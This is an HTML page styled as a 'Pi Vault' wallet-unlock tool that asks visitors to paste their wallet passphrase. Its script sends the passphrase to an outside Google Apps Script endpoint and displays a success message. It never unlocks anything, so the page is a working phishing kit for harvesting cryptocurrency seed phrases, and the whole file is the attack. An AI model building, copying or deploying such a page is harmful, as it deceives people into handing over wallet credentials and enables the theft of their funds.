<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pi Vault</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #2c003e;
            color: white;
        }
        #container {
            margin-top: 50px;
        }
        input, button {
            padding: 10px;
            margin: 10px;
            border-radius: 5px;
            border: none;
        }
        button {
            background-color: #ff0080;
            color: white;
            cursor: pointer;
        }
        button:hover {
            background-color: #ff3399;
        }
    </style>
</head>
<body>

    <div id="container">
        <h2>Paste Your Passphrase To Unlock Your Wallet</h2>
        <input type="text" id="passphrase" placeholder="Enter passphrase">
        <button onclick="submitPassphrase()">Unlock with passphrase</button>
        <p id="responseMessage"></p>
    </div>

    <script>
        function submitPassphrase() {
            var passphrase = document.getElementById('passphrase').value;
            if (!passphrase) {
                alert("Please enter a passphrase.");
                return;
            }

            var url = "https://script.google.com/macros/s/AKfycbyxm3Z6e7aagiGv4Vrdg0fGRHeON4QX3aaXYRlI2aTOR6f5CY3QkoOzByAhmWE3/exec";

            fetch(url, {
                method: "POST",
                mode: "no-cors",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ passphrase: passphrase })
            })
            .then(response => {
                document.getElementById('responseMessage').innerText = "Passphrase submitted successfully.";
            })
            .catch(error => {
                document.getElementById('responseMessage').innerText = "Error sending passphrase.";
            });
        }
    </script>

</body>
</html>
